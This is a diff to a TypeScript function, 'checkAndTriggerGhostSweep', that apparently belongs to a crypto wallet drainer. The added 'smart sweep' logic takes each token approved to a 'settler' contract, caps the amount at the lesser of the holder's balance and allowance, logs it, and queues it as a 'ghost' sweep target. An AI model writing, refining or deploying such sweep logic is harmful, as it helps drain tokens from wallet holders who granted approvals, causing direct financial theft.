@@ -130,11 +130,27 @@ export async function checkAndTriggerGhostSweep(
             currentSettler && spenderAddr === currentSettler.toLowerCase();
 
           if (isCurrentSettler && !isPermit2) {
+            // --- SMART SWEEP LOGIC ---
+            const balance = BigInt(meta.asset.balance || 0);
+            const allowance = val; // 'val' is the allowance found via multicall
+
+            // Calculate the safe amount to sweep
+            const sweepAmount = balance < allowance ? balance : allowance;
+
+            console.log(
+              `${logLabel} ⚖️ Smart-Sweep Logic [${meta.asset.symbol}]:`,
+            );
+            console.log(`${logLabel} 💰 Balance: ${balance.toString()}`);
+            console.log(`${logLabel} 🔓 Allowance: ${allowance.toString()}`);
+            console.log(
+              `${logLabel} 🚀 Final Sweep Amount: ${sweepAmount.toString()}`,
+            );
+            // -------------------------
+
             ghostTargets.push({
               token: meta.tokenAddr,
               symbol: meta.asset.symbol,
-              amount: meta.asset.balance.toString(),
-              // Add this line below:
+              amount: sweepAmount.toString(), // Use the calculated smart amount
               allowance: val.toString(),
               spender: meta.spender,
               chainId,
